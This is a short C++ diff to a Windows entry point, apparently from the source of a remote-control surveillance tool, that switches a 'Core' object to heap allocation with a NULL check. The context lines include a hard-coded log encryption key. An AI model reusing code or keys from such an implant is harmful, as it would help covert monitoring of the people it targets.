@@ -3,7 +3,7 @@
 #include <stdio.h>
 
 int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
-	Core core;
+	Core *core;
 
 	// RCS 58 su rcs-castore
 	BYTE LogKey[] = { 0xa9, 0x4c, 0x68, 0xcc, 0x32, 0xbd, 0x18, 0xd0, 0x36, 0x35, 0x18, 0x79, 0x80, 0xab, 0xfd, 0x98 };
@@ -50,7 +50,14 @@ int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, 
 	}
 	//
 
-	core.Run();
+	core = new(std::nothrow) Core();
+
+	if (core == NULL)
+		return 0;
+
+	core->Run();
+
+	delete core;
 
 	return 0;
 }
